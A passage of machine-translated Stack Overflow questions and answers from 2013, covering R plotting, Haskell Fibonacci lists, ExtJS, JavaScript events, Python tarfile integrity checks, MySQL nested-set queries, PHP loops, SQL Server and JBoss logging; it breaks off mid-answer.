3,38    1,04    ,477    2,46    29,478
2,21    ,966    ,457    1,14    24,2387
2,49    1,59    ,298    1,18    26,3198
,86 ,395    ,02 ,406    8,591
3,38    1,85    ,539    1,5 36,4229
7,39    4,42    ,707    3,55    66,4108
2,74    ,595    ,893    1,98    30,5757
2,58    1,78    ,112    1,52    25,4771
7,28    3,49    1,44    4   68,5567
2,29    2,1 ,124    ,981    23,1381
5,35    5,37    ,154    ,737    43,0451
4,62    2,69    ,319    1,49    39,53
3,54    1,14    ,536    1,89    36,5013
1,98    1,04    ,718    ,889    26,5255
2,01    1,04    ,173    1,5 22,137
2,22    ,897    ,228    1,07    19,1992
3,5 2,33    ,456    1,52    32,9518
,86 ,474    ,152    ,393    9,0893
4,92    3,65    ,181    1,79    42,0037
2,76    ,868    1,78    2,14    48,7727
5,18    3,61    ,843    2,39    55,894
2,6 1,24    ,482    1,6 31,8021
4,95    2,74    1,29    2,35    60,1485
10,8    8,82    ,067    3,55    97,2793
2,02    1,39    ,311    1,31    18,3945
3,24    2,6 ,117    1,74    27,5003
8,22    7,07    ,531    2,56    79,0347
9,5 9,47    ,752    2,42    97,8119
4,88    2,69    ,304    2,6 44,887
5,75    3,1 ,595    1,85    58,2125
5,48    5,46    ,352    1,54    57,4186
8,08    3,37    ,065    3,58    57,4938
3,29    2,37    ,34 1,35    33,5817
3,73    1,02    5,86    3,89    115,7361
1,36    ,624    ,269    ,508    14,8479
9,92    2,81    1,26    4,77    91,6305
8,65    6,21    ,428    3,68    92,1625
4,56    1,15    ,307    2,71    37,0122
8,78    4,69    ,892    3,85    87,6535
13,1    7,63    ,981    4,81    111,3631
5,99    3,06    ,062    2,64    47,9596
3,91    2,48    ,17 3,18    38,0747
6,51    1,47    7,75    5,45    122,796
11,3    4,1 1,62    6,29    113,1166
8,12    3,99    ,867    3,49    79,2042
11,5    9,33    ,707    3,36    98,3269
3,99    2,1 ,328    1,41    33,0017
7,88    2,29    ,667    5,65    64,2417
13  5,04    2,13    6,9 119,3755
9,05    5,08    ,497    3,9 80,6768
21  19  ,645    3,66    171,4136
12,2    17,6    ,188    4,09    132,867
8,63    3,11    1,78    6,09    91,7974
4,39    1,11    ,232    3,35    32,6213
5,95    3,63    ,953    2,91    59,5369
19,7    10,6    4,03    8,59    200,5094
7,6 3,73    ,351    5   65,3966
18,1    9,87    2,75    8,19    198,5225
13,1    4,49    ,538    6,86    89,3715
25,2    13  1,42    13  210,3284
12,3    3,75    9,06    18,9    246,6618
32,3    31,5    1,8 8,49    318,7461 
```

如何在 R 中绘制它的散点图矩阵？这里，逗号表示小数点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T11:00:34.723

机会是巨大的：

*   基本散点图矩阵由基本函数提供`pairs`

*   包中提供`scatterplot.matrix`了这些的增强版本`car`

*   您也可以`splom`从`lattice`包装中使用

*   然后还有一种基于 ggplot2`ggpairs`的 实验包`GGally`

*   而且，一个非常年轻的包是`gpairs`，包含一个同名的函数

我`car`最喜欢包中的实现，但每个都有其优点，最后两个提供了最多的功能，但也是最不成熟的。

# haskell - haskell中的斐波那契序列返回所有值

> ID：16013273
> 
> 赞同：4
> 
> 时间：2013-04-15T10:47:03.730
> 
> 标签：haskell, fibonacci

我需要帮助我使用 haskell 进行分配，它返回一个列表，直到斐波那契数列中的第 n 个数字。

像

```
Main> fib 5
[0,1,1,2,3,5]
Main> fib 15
[0,1,1,2,3,5,8,13,21,34,55,89,144,233,377,610] 
```

我明白这一点

```
fib::Int->Int
fib 0 = 0
fib 1 = 1
fib n = fib (n-1) + fib (n-2) 
```

但我不知道如何生成包含直到第 n 个数字的所有值的列表。

谢谢

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-04-15T11:51:04.393

有一些很酷的方法可以做到这一点，首先是最简单的

```
fib::Int->Int
fib 0 = 0
fib 1 = 1
fib n = fib (n-1) + fib (n-2)
fibList n = map fib [1..n] 
```

或者我们可以将其合并为一个

```
fib::Int->[Int]
fib 0 = [0]
fib 1 = [1, 0]
fib n = (head (fib (n-1)) + head (fib (n-2))) : fib (n-1) 
```

所以在这里我们只是将列表构建与递归结合起来。现在我们向疯狂迈出一步

```
fib n = take n fiblist
  where fiblist = 0:1:(zipWith (+) fiblist (tail fiblist)) 
```

这`fiblist`是斐波那契数列的无限列表。我们所做的只是抓住适当的数量。这是可能的，因为 Haskell 是“懒惰的”。如果你是 Haskell 的新手，只需微笑和点头。

最后，为了踢腿和咯咯笑

```
fib = flip take . fix $ \f -> 0 : 1 : (zipWith (+) f (tail f)) 
```

除了无点和固定点而不是递归之外，这与上述相同。

同样，如果您是 haskell 的新手，前 2 个更容易理解，几周后回到最后 2 个 :)

# tree - 如何从 TreeStore Extjs4.1 获取数据

> ID：16013279
> 
> 赞同：2
> 
> 时间：2013-04-15T10:47:17.510
> 
> 标签：tree, extjs4.1

分机 JS 4.1

要从“Ext.data.Store”获取值数据，只需使用

```
var data1 = store.data.items[0].data.fieldname; 
```

或者

```
var data1 = store.getAt(0).data.fieldname; 
```

但是，在“Ext.data.TreeStore”中，这种方法是行不通的！

有什么建议么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-16T21:24:20.750

这是对 Extjs 的常见误解。Ext.data.TreeStore 和 Ext.data.Store 实际上不是很相似，也没有继承自另一个。

商店以模型数组的格式保存数据：

```
[
    {
        attribute1,
        attribute2,
        ...
    },
    ...
] 
```

而树存储以节点树结构的格式保存数据，如下所示：

```
{
    attribute1,
    attribute2,
    ...,
    children: [
        {
            attribute1,
            attribute2,
            ...,
            children: [
                ...
            ]
        }
    ]
} 
```

由于常规 store 和 treestore 底层的这些完全不同的结构，它们上的功能是完全不同的。我猜在上面的示例中，正确使用 store 和 node 函数将是：

```
var data1 = treestore.getRootNode().getChildAt(0).get(fieldname); 
```

`getRootNode()`获取树的根节点，该根节点由具有检索根节点的第一个子节点的`NodeInterface`方法的类表示。`getChildAt(index)`然后我使用该`get(dataIndex)`函数从节点中获取您想要的属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-03T03:56:45.240

This is in fact a much needed functionality.

Consider the situation when you have a tree grid with a check column, you're listening to a "checkchange" event of that column and want to find a record that was just changed.

Unfortunately, all ExtJS provides you with is a record index. Fortunately though, no one is stopping us from defining our own getAt method in our own store that does exactly what we want:

```
{
  store: 'tree',
  getAt: function (index) {
    var current = 0;
    return (function find(nodes) {
      var i, len = nodes.length;
      for (i = 0; i < len; i++) {
        if (current === index) {
          return nodes[i];
        }
        current++;
        var found = find(nodes[i].childNodes);
        if (found) {
          return found;
        }
      }
    }(this.tree.root.childNodes));
  }
} 
```

# javascript - 按钮的 Onclick 事件未调用 Javascript 方法

> ID：16013280
> 
> 赞同：1
> 
> 时间：2013-04-15T10:47:18.453
> 
> 标签：javascript, asp.net, browser

我有一个带有按钮的表单。当我使用按钮的事件调用 Javascript 方法`onclick`时，它可以在 Google Chrome 和 Internet Explorer 中运行。但是当我使用 Firefox 时，`onclick`按钮的事件不会调用 Javascript 方法。

```
function openHistory()
{
    window.open("frmCLogHistory.aspx?txtCLogID="+document.all['<%=txtCLogID.ClientID %>'].value, 'abc', 'fullscreen=no,top=10,left=100,toolbar=no,status=no,menubar=no,scrollbars=yes,resizable=no, directories=no,location=no,width=800,height=630,titlebar=no');
}
</script>

<input type="button" name="showHistory" value="Show History"  
onclick="javascript:openHistory()" style="width:120px;"  class="GVButton" /> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:04:41.493

尝试这个

```
function openHistory()
{
  var element= document.getElementById('<%= txtCLogID.ClientID %>').value;
  window.open("frmCLogHistory.aspx?txtCLogID="+element, 'abc', 'fullscreen=no,top=10,left=100,toolbar=no,status=no,menubar=no,scrollbars=yes,resizable=no,   directories=no,location=no,width=800,height=630,titlebar=no');
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:10:00.653

如果代码在 Internet Explorer 和 Chrome 中有效，但在 Firefox 中无效，那么可能是 Firefox 中的弹出窗口阻止程序阻止了您的`window.open()`通话？将一些调试代码添加到您的函数中，例如：

```
function openHistory()
{
    alert('Firing window.open');
    window.open( <... url ... > );
} 
```

看看你是否收到警报，这意味着你的函数正在触发，只是`window.open()`调用失败了。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T10:50:50.103

## 更新 1

使用如下

```
 <input type="button" name="showHistory" value="Show History" class="GVButton"
     onclick="javascript:return openHistory()" style="width:120px;"  /> 
```

JavaScript 代码

```
 function openHistory()
 {
    var pageName="frmCLogHistory.aspx?";
        pageName+="txtCLogID="+document.getElementById('<%=txtCLogID.ClientID %>').value;
    var options ="fullscreen=no,top=10,left=100,toolbar=no,status=no,menubar=no,scrollbars=yes,resizable=no,directories=no,location=no,width=800,height=630,titlebar=no";
    window.open(pageName,'abc',options);
   return false;
} 
```

# php - 这是什么意思：要渲染的确切控制器作为构造函数参数传递给此侦听器 - Symfony2

> ID：16013282
> 
> 赞同：3
> 
> 时间：2013-04-15T10:47:22.573
> 
> 标签：php, symfony

在[这里](http://symfony.com/doc/current/components/http_kernel/introduction.html#handling-exceptions-the-kernel-exception-event)它说：

> 3) 一个控制器被执行并传递了扁平化的异常。要渲染的确切控制器作为构造函数参数传递给此侦听器。此控制器将返回此错误页面的最终响应。

我需要这样做：

> 要渲染的确切控制器作为构造函数参数传递给此侦听器

这是什么意思？文档没有示例。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-27T15:11:16.797

最好的选择是查看[ExceptionListener](https://github.com/symfony/symfony/blob/2.2/src/Symfony/Component/HttpKernel/EventListener/ExceptionListener.php)的代码。如您所见，构造函数将 $controller 作为参数。它是一个字符串，指示将在子请求中使用哪个控制器。默认情况下它是一个

```
Symfony\Bundle\TwigBundle\Controller\ExceptionController::showAction 
```

并且此控制器将返回此错误异常的最终响应

# vim - 使用 Ctrl 的快捷方式在 gvim 中不起作用

> ID：16013290
> 
> 赞同：1
> 
> 时间：2013-04-15T10:47:52.113
> 
> 标签：vim, shortcut, ctrl

`Ctrl`我正在尝试为 Vim 制作快捷方式，以便在按+时使其更适合世界语`W`：

`imap <C-ĝ> <C-w> "Delete last word`

它可以很好地工作，`vim`但`gvim`它只是赋予`ĝ`角色。

我怎样才能让它工作`gvim`？

编辑：我发现`vim`即使没有映射它也可以使用。但我仍然无法让它对抗`gvim`.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-26T10:51:39.567

我在使用西里尔字母时遇到了同样的问题。例如，在插入模式下键入`Ctrl`+只会产生. 我做了一些搜索，.. 看起来这是一个 GVim 特有的问题。`Ы``Ы`

希望还有其他的 GUI 和 Qt 版本能更好地工作。它将`Ctrl`+`Ы`视为`Ctrl`+ `S`，就像其他 X 应用程序一样（`S`并`Ы`在我的键盘上共享相同的键）。xev 显示相同的结果。所以，看看[http://gitorious.org/vim-qt](http://gitorious.org/vim-qt)。

# python - 在 Python 中检查 tarfile 的完整性

> ID：16013291
> 
> 赞同：3
> 
> 时间：2013-04-15T10:48:07.213
> 
> 标签：python, error-handling, integrity, tarfile

我正在将我的备份脚本从 shell 转换为 Python。我的旧脚本的功能之一是通过执行以下操作检查创建的 tar 文件的完整性： gzip -t 。

这在 Python 中似乎有点棘手。

似乎这样做的唯一方法是读取 tarfile 中的每个压缩的 TarInfo 对象。

有没有一种方法可以检查 tar 文件的完整性，而不需要提取到磁盘或将其保存在内存中（完整地）？

freenode 上#python 上的好人建议我应该逐块读取每个 TarInfo 对象，丢弃读取的每个块。

我必须承认我不知道如何做到这一点，因为我刚刚开始使用 Python。

想象一下，我有一个 30GB 的 tarfile，其中包含从 1kb 到 10GB 的文件......

这是我开始编写的解决方案：

```
try:
    tardude = tarfile.open("zero.tar.gz")
except:
    print "There was an error opening tarfile. The file might be corrupt or missing."

for member_info in tardude.getmembers():
    try:
        check = tardude.extractfile(member_info.name)
    except:
        print "File: %r is corrupt." % member_info.name

tardude.close() 
```

这段代码远未完成。我不敢在一个巨大的 30GB tar 存档上运行它，因为在某一时刻，检查将是 10+GB 的对象（如果我在 tar 存档中有这么大的文件）

奖励：我尝试手动破坏 zero.tar.gz（十六进制编辑器 - 编辑几个字节的中间文件）。第一个 except 没有捕获 IOError ......这是输出：

```
Traceback (most recent call last):
  File "./test.py", line 31, in <module>
    for member_info in tardude.getmembers():
  File "/usr/lib/python2.7/tarfile.py", line 1805, in getmembers
    self._load()        # all members, we first have to
  File "/usr/lib/python2.7/tarfile.py", line 2380, in _load
    tarinfo = self.next()
  File "/usr/lib/python2.7/tarfile.py", line 2315, in next
    self.fileobj.seek(self.offset)
  File "/usr/lib/python2.7/gzip.py", line 429, in seek
    self.read(1024)
  File "/usr/lib/python2.7/gzip.py", line 256, in read
    self._read(readsize)
  File "/usr/lib/python2.7/gzip.py", line 320, in _read
    self._read_eof()
  File "/usr/lib/python2.7/gzip.py", line 342, in _read_eof
    hex(self.crc)))
IOError: CRC check failed 0xe5384b87 != 0xdfe91e1L 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2015-08-31T13:48:41.553

只是对[Aya 的](https://stackoverflow.com/users/172176/aya)回答进行了微小的改进，使事情变得更加惯用（尽管我正在删除一些错误检查以使机制更加明显）：

```
BLOCK_SIZE = 1024

with tarfile.open("zero.tar.gz") as tardude:
    for member in tardude.getmembers():
        with tardude.extractfile(member.name) as target:
            for chunk in iter(lambda: target.read(BLOCK_SIZE), b''):
                pass 
```

这实际上只是消除了`while 1:`（有时被认为是轻微的代码气味）和`if not data:`检查。另请注意，使用将其`with`限制为 Python 2.7+

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-15T11:23:40.460

> 我尝试手动破坏 zero.tar.gz（十六进制编辑器 - 编辑几个字节的中间文件）。第一个 except 没有捕获 IOError ......

如果您查看回溯，您会看到它在调用时被抛出`tardude.getmembers()`，因此您需要类似...

```
try:
    tardude = tarfile.open("zero.tar.gz")
except:
    print "There was an error opening tarfile. The file might be corrupt or missing."

try:
    members = tardude.getmembers()
except:
    print "There was an error reading tarfile members."

for member_info in members:
    try:
        check = tardude.extractfile(member_info.name)
    except:
        print "File: %r is corrupt." % member_info.name

tardude.close() 
```

至于原来的问题，你几乎就在那里。你只需要从你的`check`对象中读取数据，比如......

```
BLOCK_SIZE = 1024

try:
    tardude = tarfile.open("zero.tar.gz")
except:
    print "There was an error opening tarfile. The file might be corrupt or missing."

try:
    members = tardude.getmembers()
except:
    print "There was an error reading tarfile members."

for member_info in members:
    try:            
        check = tardude.extractfile(member_info.name)
        while 1:
            data = check.read(BLOCK_SIZE)
            if not data:
                break
    except:
        print "File: %r is corrupt." % member_info.name

tardude.close() 
```

...这应该确保您一次不会使用超过`BLOCK_SIZE`字节的内存。

此外，您应该尽量避免使用...

```
try:
    do_something()
except:
    do_something_else() 
```

...因为它会掩盖意外的异常。尝试仅捕获您实际打算处理的异常，例如...

```
try:
    do_something()
except IOError:
    do_something_else() 
```

...否则您会发现更难以检测代码中的错误。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-15T11:21:52.140

您可以使用该`subprocess`模块来调用`gzip -t`文件...

```
from subprocess import call
import os

with open(os.devnull, 'w') as bb:
    result = call(['gzip', '-t', "zero.tar.gz"], stdout=bb, stderr=bb) 
```

如果`result`不为 0，则有问题。不过，您可能想检查 gzip 是否可用。我为此编写了一个实用函数；

```
import subprocess
import sys
import os

def checkfor(args, rv = 0):
    """Make sure that a program necessary for using this script is
    available.

    Arguments:
    args  -- string or list of strings of commands. A single string may
             not contain spaces.
    rv    -- expected return value from evoking the command.
    """
    if isinstance(args, str):
        if ' ' in args:
            raise ValueError('no spaces in single command allowed')
        args = [args]
    try:
        with open(os.devnull, 'w') as bb:
            rc = subprocess.call(args, stdout=bb, stderr=bb)
        if rc != rv:
            raise OSError
    except OSError as oops:
        outs = "Required program '{}' not found: {}."
        print(outs.format(args[0], oops.strerror))
        sys.exit(1) 
```

# mysql - 修改的预排序树：选择特定类型的顶部元素

> ID：16013298
> 
> 赞同：0
> 
> 时间：2013-04-15T10:48:28.903
> 
> 标签：mysql, database, preorder

我使用修改后的预排序树将 GEO 位置存储在我的应用程序中的单个表 LOC_TABLE 中。例如，希腊的子树示例如下所示：

```
+-------+---------------+-----+-----+------+
| ID    | NAME          | LFT | RGT | TYPE |
+-------+---------------+-----+-----+------+
|    10 | Greece        | 100 | 200 |   3  |
|    20 | Crete Isl.    | 120 | 140 |   4  |
|    25 | Crete-Vamos   | 121 | 122 |   4  |
|    26 | Crete-Rethymno| 123 | 124 |   4  |
 ....
+-------+---------------+-----+-----+------+ 
```

`TYPE`列用于存储位置类型（3 - 国家，4 - 城市）。如您所见，Crete 存储为 city，其中包含其他城市（例如`Vamos`和`Rethymno`）作为​​其子级。

我需要执行两种类型的查询：

1）获取特定父项下特定类型的所有位置。

2）获取特定父级下特定类型的所有顶级位置：仅`Crete Isl.`在查询希腊境内的城市时应返回提供的位置示例，因为`Crete Isl.`没有城市类型的父级，而城市`Vamos`和`Rethymno`具有城市类型的父级 -`Crete Isl.`

在每种情况下执行最快的查询是什么？

对于第一种情况，我考虑使用两个查询（首先，获取希腊的 LFT 和 RGT，第二个获取类型 = 4 的所有位置，它们具有适当的 LFT 和 RGT）或使用某种连接来一步获取所有位置. 哪个是最好的方法？

对于第二种情况，我目前没有任何合适的想法。我尝试了简单的子选择：

```
select loc.* from LOC_TABLE loc 
where 4 not in 
(select TYPE from LOC_TABLE p 
    where p.lft < loc.lft AND p.rgt > loc.rgt) 
AND loc.LFT > 100 AND loc.RGT < 200; 
```

但是太长了。

我不介意添加更多列并用一些值填充它们，这将有助于加快这两种类型的查询。但我需要快速获取数据。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:16:33.233

我会尝试这样的事情： -

```
SELECT b.*
FROM LOC_TABLE a
INNER JOIN LOC_TABLE b
ON a.LFT < b.LFT AND a.RGT > b.RGT
WHERE a.ID = 10
AND b.TYPE = 4 
```

简单的加入。

对于你的第二个问题，也许是这样的。找到父级，然后从中找到正确类型下的所有记录。找到与此孩子相同类型的任何父母。如果找到，则忽略。

```
SELECT b.*
FROM LOC_TABLE a
INNER JOIN LOC_TABLE b ON a.LFT < b.LFT AND a.RGT > b.RGT
LEFT JOIN LOC_TABLE c ON c.LFT > b.LFT AND c.RGT < b.RGT AND b.TYPE = c.TYPE
WHERE a.ID = 10
AND b.TYPE = 4
AND c.ID IS NULL 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:06:48.957

`ID`对于具有给定 by的特定记录的城市和后代的所有记录`:id`，请使用

```
SELECT descendant.ID, descendant.NAME, descendant.TYPE 
FROM LOC_TABLE location
INNER JOIN LOC_TABLE descendant
    ON descendant.LFT > location.LFT AND descendant.RGT < location.RGT
WHERE location.ID = :id AND TYPE = 4 
```

对于所有记录的城市和记录的子记录，使用`ID`givien by `:id`，使用

```
SELECT child.ID, child.NAME, child.TYPE 
FROM LOC_TABLE location
INNER JOIN LOC_TABLE child
    ON child.LFT > location.LFT AND child.RGT < location.RGT
LEFT OUTER JOIN LOC_TABLE intermediate
    ON intermediate.LFT < child.LFT
    AND intermediate.RGT > child.RGT
    AND intermediate.LFT > location.LFT
    AND intermediate.RGT < location.RGT
WHERE location.ID = :id
AND child.TYPE = 4
AND intermediate.ID IS NULL 
```

`LEFT OUTER JOIN`连同条件一起`intermediate.ID IS NULL`消除了那些记录，其中`child`有一个`location`是 的祖先的后代`child`。

# javascript - focus() 方法仅在 Internet Explorer 中滚动到顶部

> ID：16013307
> 
> 赞同：1
> 
> 时间：2013-04-15T10:49:01.407
> 
> 标签：javascript, jquery, internet-explorer, focus

在每个浏览器`focus()`方法中`input`滚动到页面顶部。我用这样的自定义方法破解它：

```
$.fn.focusNo = function () {
    var x = (window.pageXOffset !== undefined) ? window.pageXOffset : (document.documentElement || document.body).scrollLeft,
        y = (window.pageYOffset !== undefined) ? window.pageYOffset : (document.documentElement || document.body).scrollTop;

    this.focus();
    window.scrollTo(x, y);
}; 
```

但在内部资源管理器 (9, 10) 中，此解决方案不起作用..

**你怎么解决这个问题？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-08-31T11:58:28.247

IE 没有`scrollTo` ，而是`doScroll`.
此外，IE 9 及更高版本已弃用 `doScroll`，而是使用 property`scrollLeft`或`scrollTop`.
链接到 IE[滚动](https://msdn.microsoft.com/en-us/library/ms536414(v=vs.85).aspx)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-15T10:55:47.283

改用jquery。

```
$(document).scrollTop(x);
$(document).scrollLeft(y); 
```

# c# - awesomium：处理 java 脚本点击没有意义

> ID：16013310
> 
> 赞同：3
> 
> 时间：2013-04-15T10:49:29.090
> 
> 标签：c#, javascript, awesomium

这是我运行的代码（WPF 上的 webcontrol）：

```
private void htmlClick(string action) {
    if (this.webControlGroove.IsDocumentReady) {
        this.webControlGroove.ExecuteJavascript(
            String.Format(
                @"document.getElementById('{0}').click();", action));
        }
    } 
```

我可以看到我的操作以正确的方式进入字符串，当我`document.getElementById('myElement').click();`在 chrome 控制台中运行时，我可以看到结果

但是当我在 awesomium 中运行它时，这毫无意义。为什么？我该如何调试它？

# ruby-on-rails - 如何在设计 rails gem 中测试来宾用户？

> ID：16013311
> 
> 赞同：2
> 
> 时间：2013-04-15T10:49:33.860
> 
> 标签：ruby-on-rails, ruby, rspec, devise

我想在我的应用程序中使用设计，我需要来宾用户。我尝试使用这个例子 - [https://github.com/plataformatec/devise/wiki/How-To:-Create-a-guest-user](https://github.com/plataformatec/devise/wiki/How-To:-Create-a-guest-user)

现在，我想为用户编写一些 rspec 测试来描述用户成为成员时的行为（这是应用程序控制器中的 logging_in 操作）。

所以，我现在的测试是这样的：

```
post :create_guest_user
guest_user = User.find(session[:guest_user_id])
sign_in(guest_user)

guest_user_id = guest_user.id

# Guest user create resume
post = guest_user.posts.build(:title => 'test of guest user')
post.save.should be_true
guest_user.posts.count.should == 1

# Guest user become a member 
```

我不知道，如何做“#Guest 用户成为会员”部分，我想检查新用户将在注册后创建，所有帖子都属于他。在应用程序控制器中我有

```
def logging_in    
guest_user.posts.each do |post|
  post.user = current_user
  post.save
end
end 
```

我怎么能这样做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-04-24T10:40:24.177

您不能`sign_in`使用访客用户。实际上我现在不知道为什么，也许是因为它无效。无论如何要以访客身份登录，您需要将其添加到`ControllerMacros`：

```
module ControllerMacros
  # ...
  def login_guest(guest = false)
    guest ||= FactoryGirl.create(:guest_user)
    @request.env['warden'] = @warden
    @request.session[:guest_user_id] = guest.id
  end
end 
```

和工厂：

```
FactoryGirl.define do
  factory :user do
    ...
  end

  factory :guest_user, class: 'User' do
    sequence(:email)  { Faker::Internet.email }
    role              :guest
    to_create         { |instance| instance.save(validate: false) }
  end
end 
```

用法：

```
describe PagesController, type: :controller do
  context '#index' do
    before do
      login_guest
      get :index
    end

    it { expect(response).to have_http_status(:success) }
    it { expect(response).to render_template('pages/index') }
  end
end 
```

# php - 使用循环递增值

> ID：16013316
> 
> 赞同：-7
> 
> 时间：2013-04-15T10:50:01.673
> 
> 标签：php

我有 2 个变量，其值为`1`和`0.5`。我总共有`200`，我想通过 2 个变量循环增加它们自己的值，然后在它们命中时停止`200`

这可以在一个`for loop`

我最初考虑使用 for 循环使用：

```
for($i=$var1;$i<=$total;$i++)
{

} 
```

这适用于其中 1 个变量。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T10:52:46.383

如果你仔细看看[`for`loop](http://php.net/manual/en/control-structures.for.php)，它支持这样的语法：

```
for ($i = 1, $j = 0; $i <= 10; $j += $i, print $i, $i++); 
```

所以你基本上可以这样做：

```
for( $i = 1, $j = 0.5; $i < 200; $i++, $j += 0.5){
    // Do stuff
} 
```

虽然我认为这可能会让一些人感到困惑，但这样写会更具可读性：

```
$j = 0;
for( $i = 0; $i < 200; $i++){
    // do stuff

    $j += 0;
} 
```

或者您也可以`$j`在每个步骤中计算：

```
$j = $i/2; // Before do stuff block 
```

但我认为这会比仅仅增加它的性能更差；

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T10:59:00.443

他们是一些使用增量工作的[已知问题](https://bugs.php.net/bug.php?id=54994)`float`， 这里是一个显示受影响的[实时示例](http://3v4l.org/F5XVD#v4310)`Output for 4.3.10 - 4.4.9, 5.0.2 - 5.5.0beta2`

您可以使用`printf`部分修复此问题或简单转换为整数然后返回浮动

```
$var = 0.5;
for($i = 0; $i < 200; $i += $var) {
     printf("%.1f\n", $i);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T10:52:18.283

在编程中一切皆有可能

这样做 $i = 1;

```
for ($i=1;$<=200;$i++); 
```

并为 $i = .5 执行此操作

```
for($i=.5; $i<=200;$i+.5); 
```

# asp.net - 从客户端javascript调用服务器端方法

> ID：16013318
> 
> 赞同：0
> 
> 时间：2013-04-15T10:50:10.737
> 
> 标签：asp.net

我想从客户端javascript调用我的代码中的一个方法。我找到了一个使用 pagemethods 的解决方案。它正在工作，但问题是服务器端方法应该是静态的。它对我不起作用，因为我想更改我的一些页面类字段。请给我提意见

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T10:55:48.177

您不能仅使用需要使用 Ajax 的 Javascript 来执行此操作，您可以参考此示例代码 [http://www.codeproject.com/Articles/238866/Invoke-Server-Methods-From-Client-Side-Using-JQuery](http://www.codeproject.com/Articles/238866/Invoke-Server-Methods-From-Client-Side-Using-JQuery)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:28:48.187

你不能那样做。您可以在 Javascript 中更改所需的页面字段，或者进行完整的回发。如果您真的想使用 Javascript 调用，您可以尝试[UpdatePanel 之](http://ajax.net-tutorials.com/controls/updatepanel-control/)类的方法。它无需刷新整个页面即可工作，并且尊重 ASP.NET 页面生命周期。

# sql-server - SQL Server：具有选择不同的唯一键冲突

> ID：16013322
> 
> 赞同：0
> 
> 时间：2013-04-15T10:50:20.303
> 
> 标签：sql-server, select, insert, unique, distinct

我有以下奇怪的问题：

我需要用伪随机数据填充一些表格。在这种情况下，我有 10 个唯一列。请不要讨论这种情况，它只是测试。

我得到了一些表格 - 每个唯一列一个表格。从每个表中，我选择需要插入到最终表中的不同的前 XX 值。由于随机性请求，我按 ROWID() 执行排序并将所有“列表”加入到一个插入到给定表中的选择中。

例子：

```
 CREATE TABLE  uqtest (col1 INT PRIMARY KEY,
                       col2 INT UNIQUE, 
                       col3 INT UNIQUE, 
                       col4 INT UNIQUE,...

 INSERT INTO [dbo].[uqtest] WITH (TABLOCK)([col1],[col2],[col3],...

 SELECT [col1].[col1],[col2].[col2],[col3].[col3],...
 FROM 
 (                
  SELECT col1,ROW_NUMBER() OVER (ORDER BY NEWID()) AS RID
           FROM
            (
            SELECT DISTINCT TOP 10000 col1 FROM [TEMPGEN_UNIQUE_uqtest_col1] ) AS col1
        ) AS col1
  INNER JOIN 
   (
            SELECT col2,ROW_NUMBER() OVER (ORDER BY NEWID()) AS RID
            FROM
            (
            SELECT DISTINCT TOP 10000 col2 FROM [TEMPGEN_UNIQUE_uqtest_col2] ) AS col2
        ) AS col2
 ON col1.RID = col2.RID
INNER JOIN (
                 SELECT col3,ROW_NUMBER() OVER (ORDER BY NEWID()) AS RID
            FROM
            (
            SELECT DISTINCT TOP 10000 col3 FROM [TEMPGEN_UNIQUE_uqtest_col3] ) AS col3
        ) AS col3
 ON col2.RID = col3.RID 
```

……

等等。（生成此脚本）

我收到以下错误消息：

> 消息 2627，级别 14，状态 1，第 1 行
> 违反 UNIQUE KEY 约束“UQ_ *uqtest* _9017EE603E52440B”。无法在对象“dbo.uqtest”中插入重复键。

就我而言，它是`col10`。

当我尝试选择`col10`并且`select distinct col10`结果相同时。

另一个测试：

我创建了临时表

```
 CREATE TABLE test10 (col VARCHAR(255)) 
```

将数据插入此表，然后在其单列上建立唯一索引 - 一切正常。

我最后的猜测：

我创建了包含 uq 约束的表

```
 CREATE TABLE test10 (col VARCHAR(255) UNIQUE) 
```

和插入的数据（使用相同的选择，但是，只有一列），它成功地完成了。

我确定我是唯一连接到服务器的用户。插入前该表为空。

非常感谢任何提示！

# java - log4j 调试在 Jboss 7.1 中不起作用

> ID：16013327
> 
> 赞同：1
> 
> 时间：2013-04-15T10:50:43.980
> 
> 标签：java, jboss, log4j, jboss7.x

我有 Jboss 7.1 的企业 Java 项目。

我为我的 EAR 添加了 log4j。

```
<dependency>
    <groupId>log4j</groupId>
    <artifactId>log4j</artifactId>
     <version>1.2.17</version>
</dependency> 
```

现在，logger.error() 运行良好。但 logger.debug 不工作。您对此有何看法？...如何启用调试？

```
@Startup 
@Stateless
import org.apache.log4j.Logger;
public class MyClass{

    public static final Logger logger = Logger.getLogger(MyClass.class.getSimpleName());

    @PostConstruct
    private void invoke() {
           logger.error("error ");
       logger.debug("debug");
        }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T10:59:35.620

log4j 不运送 log4j 罐子吗？使用您正在使用的standalone.xml 或配置文件进行配置检查。

搜索日志记录子系统，

例如

```
<subsystem xmlns="urn:jboss:domain:logging:1.1"> 
```

将 root-logger 级别名称设置为 FINER，如下所示，重新运行并检查：

```
 <root-logger>
            <level name="DEBUG"/>
            <handlers>
                <handler name="CONSOLE"/>
                <handler name="FILE"/>
            </handlers>
        </root-logger> 
```

如何添加附加程序？

假设您正在为包 xyz 中的 ABC 类初始化 Logger 对象，使用，

```
Logger LOG = LoggerFactory.getLogger(ABC.class); 
```

所以同样的 appender 看起来像这样：

```
